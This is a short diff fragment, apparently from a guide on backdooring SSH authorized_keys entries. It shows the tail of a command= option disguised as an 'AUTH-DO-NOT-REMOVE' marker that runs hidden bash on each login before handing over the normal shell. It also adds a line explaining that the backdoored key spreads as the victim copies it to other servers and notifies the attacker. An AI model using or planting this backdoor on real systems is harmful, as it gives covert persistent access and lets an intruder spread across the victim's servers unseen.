@@ -30,3 +30,4 @@ command="`###---AUTH-DO-NOT-REMOVE---`;bash -c '{
   exec -a -$(basename $SHELL) $SHELL;}'"
 ```
 
+Think of the ssh public key as a sort of `~/.bashrc` but with your backdoor inside and that gets propagaded by the user to various of his servers and you received a norification whenever its being propagated.
